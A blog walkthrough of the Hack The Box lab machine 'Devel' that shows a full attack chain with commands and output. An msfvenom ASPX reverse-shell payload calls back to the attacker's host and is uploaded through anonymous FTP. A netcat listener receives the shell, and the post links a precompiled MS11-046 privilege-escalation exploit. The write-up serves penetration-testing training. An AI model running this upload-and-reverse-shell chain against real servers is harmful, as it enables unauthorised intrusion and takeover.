---
title: HTB -- Devel
date: 2022-01-29
layout: single
header:
  teaser: assets/images/htb/devel/teaser.png
excerpt: Devel is another box from the TJNull list offering an intro to windows exploitation. It doesn't have many moving parts but can be challenging to overcome if not experienced with windows privesc or playing with ftp, making it the perfect playground. 
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - ftp
  - aspx
---

### Summary
<img src="/assets/images/htb/devel/teaser.png" width="80" height="80"/>
<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/windows8/windows8-original.svg" width="80" height="80"/>

Devel is another box from the TJNull list offering an intro to windows exploitation. It doesn't have many moving parts but can be challenging to overcome if not experienced with windows privesc or playing with ftp, making it the perfect playground. 

## Rustscan
```
# Nmap 7.91 scan initiated Sun Nov 14 09:57:57 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/kali/HTB/devel/results/devel.htb/scans/_full_tcp_nmap.txt -oX /home/kali/HTB/devel/results/devel.htb/scans/xml/_full_tcp_nmap.xml devel.htb
Nmap scan report for devel.htb (10.10.10.5)
Host is up, received user-set (0.018s latency).
Scanned at 2021-11-14 09:57:58 EST for 164s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 14 10:00:42 2021 -- 1 IP address (1 host up) scanned in 164.97 seconds
```
Looks like FTP and a web server

## FTP
Anonymous login is allowed (as we know from the nmap scan showing ftp contents), but it's still worth manually investigating.
```
└─$ ftp 10.10.10.5                                              
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

Lets try making a payload and upload it. From the listed ftp files it looks like the web end is an iis server.
```
└─$ msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -o shell.aspx 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2687 bytes
Saved as: shell.aspx
```

```
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> put shell.aspx 
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2687 bytes sent in 0.00 secs (98.5586 MB/s)
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
01-30-22  05:36PM                 2687 shell.aspx
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

browse to `devel.htb/shell.aspx` or do a curl for it

```
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.5] 49158
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest                    
The command completed with one or more errors.
```
Awesome! we are on the box. Time to upload some (possibly) helpful tools over ftp, which are then placed into `c:\inetpub\wwwroot`

<p class="notice--info">Remember to put FTP in binary mode when transferring files!</p>

## Enumeration

Normally enumeration would delve into running `winpeas` and investigating leads but the humble `systeminfo` gives us all we need.
```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          30/1/2022, 5:23:11 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.469 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.559 MB
Virtual Memory: In Use:    582 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::23c
```
Windows 6.1.7600, or a branch of windows 7. With linux boxes you typically see few kernel privescs, but for windows they are the golden standard (especially with aged boxes).

ExploitDB shows a [privesc for windows 6.1.7600](https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/40564.c). We can be lazy and [just try a precompiled version](https://github.com/abatchy17/WindowsExploits).

FTP over MS11-046 and...

![](/assets/images/htb/devel/win.png)

WIN!
